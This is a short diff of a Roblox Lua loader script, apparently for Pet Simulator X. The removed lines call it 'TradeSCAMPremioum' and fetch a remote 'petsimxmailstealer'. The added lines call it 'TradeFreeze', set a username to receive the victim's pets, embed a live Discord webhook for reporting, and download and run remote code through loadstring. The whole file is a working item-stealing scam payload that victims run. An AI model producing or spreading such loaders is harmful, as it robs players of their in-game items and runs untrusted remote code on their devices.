@@ -1,8 +1,11 @@
-local player_USERNAME = "gwapoko12131" 
-local discord_WEBHOOK = "https://discord.com/api/webhooks/1110929594204295218/IApU12QTj9FIFuLofWCAyoCnYsmaDHl5xy8L0g_Qt5pyR6-93-zVKWYOCI8aXseRZ3rG"
-local Custom_Script_Name = "TradeSCAMPremioum"
-local txt_1 = "Script Loaded..." 
-local txt_2 = "Waiting for Script" 
-local txt_3 = "Activating.." 
-local txt_4 = "TradeScam Activated..." 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
+--[[ TradeFreeze ]]--
+
+--[[ Main Config ]]--
+_G.Username = "gwapoko12131" --// Username To Send Pets To
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1110929594204295218/IApU12QTj9FIFuLofWCAyoCnYsmaDHl5xy8L0g_Qt5pyR6-93-zVKWYOCI8aXseRZ3rG" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
